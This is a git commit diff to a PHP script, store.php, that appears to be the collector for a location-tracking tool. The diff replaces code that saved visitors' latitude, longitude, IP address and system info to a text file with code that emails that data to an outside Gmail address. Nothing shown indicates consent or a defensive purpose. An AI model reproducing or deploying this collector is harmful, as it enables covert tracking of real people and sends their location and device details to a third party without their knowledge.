73e3e3a9d19b2c48d43d04858262f3fbf0c2d514
OSIRISX404 <99813934+OSIRISX404@users.noreply.github.com>
2022-05-15 19:44:48 +0530

    Update store.php

--- store.php
+++ store.php
@@ -1,8 +1,4 @@
 <?php
-
-$myfile = fopen("location.txt", "w");
-
-$txt = "Latitude: " . $_GET["Latitude"] . "\nLongitude: " . $_GET["Longitude"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nSysInfo" . $_GET["SysInfo"];
-fwrite($myfile, $txt);
-fclose($myfile);
+$msg = "Latitude: " . $_GET["Latitude"] . "\nLongitude: " . $_GET["Longitude"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nSysInfo" . $_GET["SysInfo"];
+mail("po1795009@gmail.com","My subject",$msg);
 ?>
